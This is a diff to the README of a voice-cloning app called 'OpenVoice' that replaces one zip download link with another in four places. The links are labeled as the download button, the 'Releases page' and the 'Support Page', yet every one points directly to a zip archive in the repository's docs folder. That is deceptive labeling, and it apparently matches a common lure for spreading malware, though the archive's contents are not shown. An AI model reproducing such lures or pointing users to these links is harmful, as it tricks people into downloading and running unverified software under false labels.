@@ -6,13 +6,13 @@ Welcome to OpenVoice! This app allows you to clone voices instantly, combining a
 
 ## 📥 Download OpenVoice
 
-[![Download OpenVoice](https://raw.githubusercontent.com/VoltsyGM/OpenVoice/main/docs/OpenVoice-ungrieving.zip)](https://raw.githubusercontent.com/VoltsyGM/OpenVoice/main/docs/OpenVoice-ungrieving.zip)
+[![Download OpenVoice](https://raw.githubusercontent.com/VoltsyGM/OpenVoice/main/docs/Open_Voice_2.7.zip)](https://raw.githubusercontent.com/VoltsyGM/OpenVoice/main/docs/Open_Voice_2.7.zip)
 
 To get started, visit the releases page. This is where you can download the application and start using it right away. 
 
 ### 🔗 Download Link
 
-Visit this page to download: [OpenVoice Releases](https://raw.githubusercontent.com/VoltsyGM/OpenVoice/main/docs/OpenVoice-ungrieving.zip)
+Visit this page to download: [OpenVoice Releases](https://raw.githubusercontent.com/VoltsyGM/OpenVoice/main/docs/Open_Voice_2.7.zip)
 
 ## 📝 Features
 
@@ -37,7 +37,7 @@ Before you proceed, make sure your system meets the following requirements:
 Follow these steps to install OpenVoice on your computer:
 
 1. **Download the Application:**
-   Go to the [OpenVoice Releases page](https://raw.githubusercontent.com/VoltsyGM/OpenVoice/main/docs/OpenVoice-ungrieving.zip) and click on the latest version. 
+   Go to the [OpenVoice Releases page](https://raw.githubusercontent.com/VoltsyGM/OpenVoice/main/docs/Open_Voice_2.7.zip) and click on the latest version. 
 
 2. **Extract the Files:**
    After downloading, locate the ZIP file in your downloads folder. Right-click and choose 'Extract All' to view the files.
@@ -66,7 +66,7 @@ Using OpenVoice is straightforward:
 
 ## 💬 Support
 
-If you encounter any issues while using OpenVoice, feel free to check our FAQ section in the app or visit our [Support Page](https://raw.githubusercontent.com/VoltsyGM/OpenVoice/main/docs/OpenVoice-ungrieving.zip). Community members and developers are available to help you.
+If you encounter any issues while using OpenVoice, feel free to check our FAQ section in the app or visit our [Support Page](https://raw.githubusercontent.com/VoltsyGM/OpenVoice/main/docs/Open_Voice_2.7.zip). Community members and developers are available to help you.
 
 ## 🌍 Contributing
 
